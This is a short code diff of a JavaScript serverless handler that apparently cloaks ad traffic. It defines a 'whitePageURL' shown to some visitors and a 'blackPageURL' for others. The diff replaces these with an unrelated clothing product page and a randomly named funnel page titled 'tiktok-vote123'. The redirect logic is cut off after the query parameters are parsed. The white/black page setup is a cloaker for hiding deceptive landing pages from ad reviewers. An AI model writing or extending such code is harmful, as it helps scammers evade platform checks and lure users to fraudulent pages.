@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://hollistercousa.vercel.app/?utm_campaign=__AID_NAME__";
-    const blackPageURL = "https://www.hollisterco.com/shop/wd/p/relaxed-cooling-tee-5-pack-57373830?categoryId=16398&faceout=model&seq=02";
+    const whitePageURL = "https://www.reginald.ro/en/produs/pantaloni-eleganti-de-barbati-slim-fit-galben-lemon-elastici-conici-pn340/?srsltid=AfmBOoqegINFQi991NdItfIDgCdyocbvznosi0tWqfq9-33Fy_qzHGuI";
+    const blackPageURL = "https://YAbHewMyUM.myfunnelish.com/tiktok-vote123";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
